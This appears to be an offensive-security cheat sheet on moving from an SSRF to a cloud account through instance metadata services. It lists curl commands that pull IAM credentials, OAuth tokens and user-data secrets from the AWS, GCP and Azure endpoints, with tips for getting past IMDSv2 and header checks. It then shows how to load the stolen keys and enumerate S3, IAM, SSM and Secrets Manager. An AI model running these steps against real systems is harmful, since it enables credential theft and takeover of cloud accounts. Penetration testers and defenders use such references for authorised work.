# Cloud Metadata Services

The metadata endpoint is the fastest path from SSRF to cloud account.

---

## AWS — `169.254.169.254`

IMDSv1 (no token):

```bash
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
curl http://169.254.169.254/latest/user-data/
```

IMDSv2 (token required):

```bash
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/
```

Via SSRF, IMDSv2 needs a `PUT` — most SSRF can only `GET`. Try the `/latest/api/token`
path anyway; some proxies convert.

---

## GCP — `metadata.google.internal`

Requires `Metadata-Flavor: Google`:

```bash
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/project/attributes/
```

Via SSRF, the header is the blocker. Some frameworks let you set headers on the fetch
(`?url=` + header injection), or use `http://metadata.google.internal` with the header
already attached by the client.

---

## Azure — `169.254.169.254`

Requires `Metadata: true`:

```bash
curl -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

---

## Others

| Provider | Endpoint |
|---|---|
| DigitalOcean | `http://169.254.169.254/metadata/v1/` |
| Alibaba | `http://100.100.100.200/latest/meta-data/` |
| Oracle | `http://169.254.169.254/opc/v1/instance/` |
| OpenStack | `http://169.254.169.254/latest/meta-data/` |
| Kubernetes | `https://kubernetes.default.svc/api/v1/namespaces/default/pods` |

---

## Using the credentials

```bash
export AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=...
aws sts get-caller-identity
aws s3 ls
aws iam list-attached-role-policies --role-name <role>
```

GCP: `curl -H "Authorization: Bearer $TOKEN" https://www.googleapis.com/...`

---

## Go deeper

1. Read `/latest/user-data/` — bootstrap scripts carry secrets.
2. Enumerate the role's policies before touching anything.
3. Check for `ssm` parameters and `secretsmanager` — they hold the crown jewels.
4. Check whether the instance profile can assume a more privileged role.

---

## Related

- `02-web/ssrf.md`
- `00-core/impact-proof.md`
